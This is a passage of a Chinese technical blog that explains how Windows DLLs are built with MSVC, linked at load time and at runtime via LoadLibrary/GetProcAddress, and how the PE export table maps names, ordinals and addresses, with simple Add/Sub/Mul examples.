class="comment">//程序可以运行的体系结构,比如x86,x86_64</span></span><br><span class="line">    DWORD Id;<span class="comment">//随机生成的ID</span></span><br><span class="line">    DWORD Length;<span class="comment">//符号名和库名 字符串总长度</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        WORD Hint;<span class="comment">//最有可能的序号</span></span><br><span class="line">        WORD Ordinal;</span><br><span class="line">        WORD Value;</span><br><span class="line">    &#125;</span><br><span class="line">    WORD Type;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 </span><br><span class="line">FF FF </span><br><span class="line">00 00 </span><br><span class="line">4C 01 //Architecture,x86</span><br><span class="line">F2 29 95 FA //随机数</span><br><span class="line">0E 00 00 00 //_Add\0Math.dll\0 两个字符串的总长度(包括00)</span><br><span class="line">00 00 //Hint=0,表示AddressOfNames中的下标</span><br><span class="line">08 00 //Type=8,表示x86 __cdecl调用约定</span><br><span class="line"></span><br><span class="line">5F 41 64 64 00 //_Add </span><br><span class="line">4D 61 74 68 2E 64 6C 6C 00 //Math.dll </span><br></pre></td></tr></table></figure>
<h2 id="工具">工具</h2>
<h3 id="msvc">MSVC</h3>
<h4 id="cl-c-只编译不链接生成目标模块">cl /c
只编译,不链接,生成目标模块</h4>
<h4 id="lib-extract-out-从lib文件中提取obj文件">lib /EXTRACT:<目标文件>
/OUT:<目标文件> 从lib文件中提取obj文件</h4>
<h4 id="lib-math.c-namelibmath.lib-制作静态库">lib Math.c
/NAME:libMath.lib 制作静态库</h4>
<h4 id="link-dll-math.obj-制作动态库">link /dll Math.obj 制作动态库</h4>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/08/18/DLL%E4%B8%8E%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/18/DLL%E4%B8%8E%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/" class="post-title-link" itemprop="url">程序员的自我修养 chapter 9 DLL</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-08-18 10:15:00" itemprop="dateCreated datePublished" datetime="2022-08-18T10:15:00+08:00">2022-08-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-10-17 01:16:47" itemprop="dateModified" datetime="2024-10-17T01:16:47+08:00">2024-10-17</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="多练练">多练练</h1>
<blockquote>
<p>菜就DLL</p>
</blockquote>
<p>DLL刚用起来的时候感觉狠抽象</p>
<p>用MSVC编译生成DLL的同时还会伴随形成两个文件</p>
<p>dll,exp,lib他仨就跟那黄金三镖客似的</p>
<p>使用link命令链接的时候却不用指定dll文件,只需要指定lib文件.</p>
<p>但是运行的时候dll还得和exe在同一个目录下面,否则就报告缺少哪个哪个dll</p>
<p>要是用gcc链接吧,就可以直接链接dll,什么exp什么lib根本用不到</p>
<p>到底怎么才算是一个标准的写法?DLL怎么写,怎么编译,怎么链接.都是问题</p>
<h2 id="dll">DLL</h2>
<p>windows上的动态库,特点不用废话了</p>
<h3 id="创建dll">创建DLL</h3>
<h4 id="declspecdllexport">__declspec(dllexport)</h4>
<p>表示该符号(函数或者全局变量)是要从本DLL中导出的.</p>
<blockquote>
<p>就DLL屁事多,创建so动态库的时候也没见声明为导出函数</p>
</blockquote>
<blockquote>
<p>可以不使用<code>__declspec(dllexport)</code>,改为使用链接脚本导出符号</p>
<h4 id="使用链接脚本">使用链接脚本</h4>
<p>除了用<code>__declspec</code>声明导入导出函数,还可以使用.def文件控制链接过程</p>
<p><code>Math.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> <span class="title function_">Add</span><span class="params">(<span class="type">double</span> a,<span class="type">double</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">double</span> <span class="title function_">Sub</span><span class="params">(<span class="type">double</span> a,<span class="type">double</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a-b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">double</span> <span class="title function_">Mul</span><span class="params">(<span class="type">double</span> a,<span class="type">double</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a*b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Math.def</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LIBRARY Math</span><br><span class="line">EXPORTS</span><br><span class="line">Add</span><br><span class="line">Sub</span><br><span class="line">Mul</span><br></pre></td></tr></table></figure>
<p>使用链接脚本编译<code>Math.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cl Math.c /LD /DEF Math.def</span><br></pre></td></tr></table></figure>
<p>此步执行后还是生成了老四样</p>
<p>之后链接就按照"使用DLL"进行</p>
</blockquote>
<h4 id="math.c">Math.c</h4>
<p>一个很简单的DLL文件<code>Math.c</code>,这里使用<code>__declspec(dllexport)</code>声明导出符号</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__declspec(dllexport) <span class="type">double</span> <span class="title function_">Add</span><span class="params">(<span class="type">double</span> a,<span class="type">double</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line">__declspec(dllexport) <span class="type">double</span> <span class="title function_">Sub</span><span class="params">(<span class="type">double</span> a,<span class="type">double</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a-b;</span><br><span class="line">&#125;</span><br><span class="line">__declspec(dllexport) <span class="type">double</span> <span class="title function_">Mul</span><span class="params">(<span class="type">double</span> a,<span class="type">double</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a*b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里所有的函数都是用<code>__declspec(dllexport)</code>修饰为导出函数,作用是给链接器提供信息,如果不声明为导出函数,编译链接运行也都不会出错,但是运行的时候啥也不会发生</p>
</blockquote>
<h4 id="编译math.c">编译Math.c</h4>
<p>使用MSVC工具编译生成dll文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cl /LDd Math.c</span><br></pre></td></tr></table></figure>
<p>此后生成了四个文件,obj,lib,exp,dll</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\desktop\testDLL&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    目录: C:\Users\<span class="number">86135</span>\desktop\testDLL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">-a----</span>          <span class="number">2022</span>/<span class="number">8</span>/<span class="number">8</span>     <span class="number">15</span>:<span class="number">47</span>            <span class="number">222</span> Math.c</span><br><span class="line"><span class="literal">-a----</span>          <span class="number">2022</span>/<span class="number">8</span>/<span class="number">8</span>     <span class="number">15</span>:<span class="number">48</span>         <span class="number">339968</span> Math.dll</span><br><span class="line"><span class="literal">-a----</span>          <span class="number">2022</span>/<span class="number">8</span>/<span class="number">8</span>     <span class="number">15</span>:<span class="number">48</span>            <span class="number">810</span> Math.exp</span><br><span class="line"><span class="literal">-a----</span>          <span class="number">2022</span>/<span class="number">8</span>/<span class="number">8</span>     <span class="number">15</span>:<span class="number">48</span>           <span class="number">1918</span> Math.lib</span><br><span class="line"><span class="literal">-a----</span>          <span class="number">2022</span>/<span class="number">8</span>/<span class="number">8</span>     <span class="number">15</span>:<span class="number">48</span>            <span class="number">779</span> Math.obj</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>文件</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>Math.obj</td>
<td>编译阶段完成的产物,目标文件</td>
</tr>
<tr>
<td>Math.lib</td>
<td>导入库,起到胶水作用</td>
</tr>
<tr>
<td>Math.exp</td>
<td></td>
</tr>
<tr>
<td>Math.dll</td>
<td>动态库本尊</td>
</tr>
</tbody>
</table>
<h3 id="使用dll">使用DLL</h3>
<h4 id="declspecdllimport">__declspec(dllimport)</h4>
<p>表示该符号是从其他DLL中导入的</p>
<p>使用DLL的过程就是引入DLL导出符号的过程,即导入过程</p>
<h4 id="testmath.c">TestMath.c</h4>
<p>同一目录下<code>TestMath.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">__declspec(dllimport) <span class="type">double</span> <span class="title function_">Sub</span><span class="params">(<span class="type">double</span>,<span class="type">double</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">double</span> result=Sub(<span class="number">1.0</span>,<span class="number">8.9</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;result=%.2f&quot;</span>,result);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="编译testmath.c">编译TestMath.c</h4>
<p>首先将<code>TestMath.c</code>编译成目标文件<code>TestMath.obj</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cl /c TestMath.c</span><br></pre></td></tr></table></figure>
<h4 id="链接导入库">链接导入库</h4>
<p>然后将<code>TestMath.obj</code>与刚才的库文件链接</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link TestMath.obj Math.lib</span><br></pre></td></tr></table></figure>
<p>生成了TestMath.exe</p>
<p>这就很奇怪了,为啥参与链接的是<code>Math.lib</code>一个静态库文件,而不是<code>Math.dll</code>动态库文件?</p>
<blockquote>
<p>甚至直接链接dll文件会报错</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\desktop\testDLL&gt; link TestMath.obj Math.dll</span><br><span class="line">Microsoft (<span class="built_in">R</span>) Incremental Linker Version <span class="number">14.31</span>.<span class="number">31106.2</span></span><br><span class="line">Copyright (C) Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">Math.dll : fatal error LNK1107: 文件无效或损坏: 无法在 <span class="number">0</span>x300 处读取</span><br></pre></td></tr></table></figure>
<p>直接链接exp文件也会出错</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220808160800411.png"
alt="image-20220808160800411" />
<figcaption aria-hidden="true">image-20220808160800411</figcaption>
</figure>
<h4 id="运行testmath.exe">运行TestMath.exe</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./TestMath.exe</span><br><span class="line">result=-7.90</span><br></pre></td></tr></table></figure>
<h3 id="运行时链接">运行时链接</h3>
<p>前面使用DLL是装载时导入动态库.</p>
<p>现在要在运行时导入动态库</p>
<h4 id="loadlibray">LoadLibray</h4>
<p>装载一个dll到进程的地址空间,作用类似于linux上的dlopen</p>
<h4 id="getprocaddress">GetProcAddress</h4>
<p>查找某dll库中的某个符号的地址,作用类似于linux上的dlsym</p>
<h4 id="freelibrary">FreeLibrary</h4>
<p>卸载一个已经加载过的dll库,作用类似于dlclose</p>
<h4 id="运行时链接-1">运行时链接</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">double</span> <span class="params">(*Func)</span><span class="params">(<span class="type">double</span>,<span class="type">double</span>)</span>;</span><br><span class="line">Func <span class="title function_">getFunction</span><span class="params">(<span class="type">char</span> *DllName,<span class="type">char</span> *FuncName)</span>&#123;</span><br><span class="line"></span><br><span class="line">    HINSTANCE hinstLib=LoadLibrary(DllName);</span><br><span class="line">    <span class="keyword">if</span>(hinstLib==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR: loading failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Func function =(Func)GetProcAddress(hinstLib,FuncName);</span><br><span class="line">    <span class="keyword">if</span>(!function)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;no such function in this module\n&quot;</span>);</span><br><span class="line">        FreeLibrary(hinstLib);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> function;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    Func Add=getFunction(<span class="string">&quot;Math.dll&quot;</span>,<span class="string">&quot;Add&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!Add)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;load function failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">double</span> Sum=Add(<span class="number">5</span>,<span class="number">7.9</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sum=%.2f\n&quot;</span>,Sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cl Math.c</span><br></pre></td></tr></table></figure>
<p>运行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./Math.exe</span><br><span class="line">Sum=<span class="number">12.90</span></span><br></pre></td></tr></table></figure>
<h2 id="导出表">导出表</h2>
<h3 id="datadirectory0">DataDirectory[0]</h3>
<p>导出符号表是PE文件头的DataDirectory结构数组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PE头-&gt;</span><br><span class="line">	NT头-&gt;</span><br><span class="line">		NT可选头-&gt;</span><br><span class="line">			DataDirectory[0]-&gt;</span><br><span class="line">				IMAGE_EXPORT_DIRECTORY-&gt;</span><br><span class="line">					-&gt;AddressOfFunctions</span><br><span class="line">					-&gt;AddressOfNames</span><br><span class="line">					-&gt;AddressOfOrdinals</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">  DWORD VirtualAddress;</span><br><span class="line">  DWORD Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY,*PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure>
<p>这个数组的第一项就是导出表信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DataDirectory[<span class="number">0</span>]&#123;</span><br><span class="line">	VirtualAddress导出表的相对虚拟地址</span><br><span class="line">	Size 导出表的大小</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="image_export_directory">IMAGE_EXPORT_DIRECTORY</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">  DWORD Characteristics;</span><br><span class="line">  DWORD TimeDateStamp;</span><br><span class="line">  WORD MajorVersion;</span><br><span class="line">  WORD MinorVersion;</span><br><span class="line">  DWORD Name;<span class="comment">//本模块名字,指向&quot;Math.dll&quot;字符串</span></span><br><span class="line">  DWORD Base;<span class="comment">//</span></span><br><span class="line">  DWORD NumberOfFunctions;<span class="comment">//导出函数总数</span></span><br><span class="line">  DWORD NumberOfNames;<span class="comment">//导出符号总数</span></span><br><span class="line">  DWORD AddressOfFunctions;<span class="comment">//导出地址表EAT</span></span><br><span class="line">  DWORD AddressOfNames;<span class="comment">//符号名表,保存导出函数的名字,按照字典序排列,方便按图索骥</span></span><br><span class="line">  DWORD AddressOfNameOrdinals;<span class="comment">//名字序号对应表</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure>
<h4 id="导出地址表">导出地址表</h4>
<p>导出地址表Export Address Table,EAT,存放的是导出函数在本库中的RVA</p>
<p>用IDA64观察这个位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.rdata:<span class="number">000000018004F</span>5B8 ; Export Address Table <span class="keyword">for</span> Math.dll</span><br><span class="line">.rdata:<span class="number">000000018004F</span>5B8 ;</span><br><span class="line">.rdata:<span class="number">000000018004F</span>5B8 off_18004F5B8   dd rva Add, rva Mul, rva Sub</span><br><span class="line">.rdata:<span class="number">000000018004F</span>5B8                                         ; DATA XREF: .rdata:<span class="number">000000018004F</span>5AC↑o</span><br></pre></td></tr></table></figure>
<p>可以发现<code>dd rva Add,rva Mul,rva Sub</code>字样,意思就是Add,Mul,Sub三个函数相对虚拟地址,双击可以直接跳转到该函数的定义</p>
<p>转化成WORD数组得到:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">short</span> off_18004F5B8[<span class="number">6</span>] = &#123;</span><br><span class="line">    <span class="number">0x1000</span>, <span class="number">0x0000</span>, <span class="number">0x1040</span>, <span class="number">0x0000</span>, <span class="number">0x1020</span>, <span class="number">0x0000</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>由于imagebase=0x180000000,因此RVA=0x1000对应VA=0x180001000,正好就是Add函数的地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000180001000</span> Add             proc near    </span><br></pre></td></tr></table></figure>
<p>然而如果不借助ida64,我们只能知道这里是一个函数的开始,但是不知道这里是哪个函数.</p>
<h4 id="函数名表">函数名表</h4>
<p>函数名表中实际存放的就是字符串的指针数组,只不过这些字符串是函数的名字罢了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rdata:<span class="number">000000018004F</span>5C4 ; Export Names Table <span class="keyword">for</span> Math.dll</span><br><span class="line">.rdata:<span class="number">000000018004F</span>5C4 ;</span><br><span class="line">.rdata:<span class="number">000000018004F</span>5C4 off_18004F5C4   dd rva aAdd, rva aMul, rva aSub</span><br></pre></td></tr></table></figure>
<p>ida给出的解释是,0x18004F5C4这个位置是Math.dll的导出函数名表,其中有三个名字,分别是aAdd,aMul,aSub,</p>
<p>貌似导出地址表和函数名表建立了一一对应的关系.</p>
<p>导出地址表的第0项是Add函数的地址,符号名表的第0项恰好又是Add函数名字字符串的指针</p>
<p>导出地址表的第1项是aMul函数的地址,符号名表的第1项又恰好是Mul函数名字字符串的指针</p>
<p>这是因为所有的导出函数都有一个名字.如果有匿名的导出函数就堆不起来了.匿名函数必须要有一个导出地址但是不一定有导出符号,因此导出地址表的表项数是大于等于函数名表的表项数的.</p>
<p>那么如果有匿名函数时,再怎样建立其函数地址和函数名的关联呢?</p>
<p>通过第三张表,符号序号对应表</p>
<h4 id="函数名符号对应表">函数名符号对应表</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rdata:<span class="number">000000018004F</span>5D0 ; Export Ordinals Table <span class="keyword">for</span> Math.dll</span><br><span class="line">.rdata:<span class="number">000000018004F</span>5D0 ;</span><br><span class="line">.rdata:<span class="number">000000018004F</span>5D0 word_18004F5D0  dw <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>              ; DATA XREF: .rdata:<span class="number">000000018004F</span>5B4↑o</span><br></pre></td></tr></table></figure>
<p>由于Math.dll中每个函数都具名,因此此时这个函数名符号对应表很奇怪,或者说很弱智</p>
<p>它的第i项上的值是i</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ordinals[0]=0</span><br><span class="line">Ordinals[1]=1</span><br><span class="line">Ordinals[2]=2</span><br></pre></td></tr></table></figure>
<p>为啥要这样呢?这是一个历史遗留问题</p>
<h5 id="历史遗留问题">历史遗留问题</h5>
<p>早期的计算机内存很小,使用函数名就得存放字符串,这会占用大量内存.</p>
<p>因此当时函数导出不能使用函数名,而是使用函数序号.</p>
<blockquote>
<p>这就相当于啥呢,监狱里给犯人编号,不管哪个狱警只要含1000号都是指同一个犯人.</p>
</blockquote>
<p>函数序号是怎么编号的呢?一个函数在地址导出表中的下标假设是x,那么它的序号就是IMAGE_EXPORT_DIRECTORY.Base+x</p>
<p>如果一个exe程序需要导入这个函数,</p>
<p>它的导入表中只需要记录IMAGE_EXPORT_DIRECTORY.Base+x,</p>
<p>然后减去IMAGE_EXPORT_DIRECTORY.Base得到对应函数在Math.dll地址导出表EAT中的下标,</p>
<p>拿这个下标一查EAT表就得到了对应函数的相对虚拟地址了</p>
<p>然而为啥要加一个Base再减去他呢?这不多此一举吗?</p>
<blockquote>
<p>书上并没有给出解释,我的想法是,假设A库有1000个导出函数,B库有500个刀殂函数,A库的Base=1,那么A库的函数序号会占用1~1000,如果B库和A库统一编号,则B库的Base就是1001.</p>
</blockquote>
<h5 id="现在的解决方案">现在的解决方案</h5>
<blockquote>
<p>在现在PC机都能达到4G,8G,16G内存的时代,显然没必要这么抠门.</p>
<p>但是以前的机器内存是以K或者M为单位的,以1976年的8086为例,它的内存有1M=1000K.</p>
<p>一个字符占用1B,假设一个库文件中有1K个函数,每个函数名字长10个字符,这就是10kB,已经占用了内存总量的1/100.</p>
<p>对于今天的x86_64一个16G内存的计算机,10K根本不算东西</p>
</blockquote>
<p>于是现在使用符号导出,向后兼容保留了序号导入的方式</p>
<p>一个exe文件的导入表中保存的是符号名,如果要调用这个库函数,需要</p>
<p>先查对应库的函数名表,得到对应函数名字符串在函数名表中的下标i0,</p>
<p>用这个下标i0作为符号名序号对应表的下标去查这个Ordinals表,Ordinals[i0]-IMAGE_EXPORT_DIRECTORY.Base得到的又是一个下标i1</p>
<p>然后拿着这个新下标i1去查导出地址表EAT,EAT[i1]上面放着的就是对应函数的相对虚拟地址了</p>
<blockquote>
<p>以书上给出的例子推导一遍</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220815165550845.png"
alt="image-20220815165550845" />
<figcaption aria-hidden="true">image-20220815165550845</figcaption>
</figure>
<p>现在需要调用Mul函数,</p>
<p>首先去AddressOfNames指向的函数名表查,由于这里的函数名是按照字典序排列的,可以使用二分查找加速.不管怎么,这里查找的结果是AddressOfNames[2]=Mul,也就是说,下标为2对应的是Mul</p>
<p>然后去AddressOfNames指向的符号序号对应表查AddressOfNames[2]=2,减去base(1)得到1,也就是说Mul在导出地址表EAT中的下标是1</p>
<p>然后去查AddressOfFunctions指向的导出地址表,AddressOfFunctions[1]=0x1020即Mul相对于其所在库基址的虚拟地址</p>
</blockquote>
<h5 id="向后兼容问题">向后兼容问题</h5>
<p>为了兼容以前的序号导入,需要保证已有的函数序号不改变,</p>
<p>还得保证所有函数名在AddressOfNames这个函数名表中按照字典序排列</p>
<p>如何同时满足这两点要求呢?</p>
<p><strong>现在时光回溯到七八十年代</strong>,假设Math.dll是当时开发的</p>
<p>假设<strong>原来的库</strong>有三个导出函数Add,Mul,Sub,一开始的时候没有符号名表(或者说有也不用),因此一开始没有导出符号,</p>
<p>老头子程序员(当时他还是个年轻人)给这三个函数手工编序号1,2,3(这个编号随意,只不过这样编最方便)考虑到base默认为1,那么分别对应导出地址表中的下标就得是0,1,2</p>
<p>于是AddressOfFunctions[0]=0x1000就是1号函数的地址,即Add函数在其库中的相对虚拟地址</p>
<blockquote>
<p>函数的序号先后对函数的<strong>地址大小</strong>有要求吗?</p>
<p>没有,在编写math.c源代码时,哪一个函数先写哪一个的相对虚拟地址就小,</p>
<p>比如这里Mul在符号表中排第2比Sub的第3靠前,但是Mul的地址0x1020比Sub的地址0x1010大</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220815170420215.png"
alt="image-20220815170420215" />
<figcaption aria-hidden="true">image-20220815170420215</figcaption>
</figure>
<p><strong>现在时光来到2202年</strong></p>
<p>如今的程序员在符号名表中给这仨个函数加上了名字,此时已有的序号不能改,因此查符号表中Mul得到的下标一定得是1,同理符号表中查Add一定得到下标0,于是这三个函数的名字安排很简单</p>
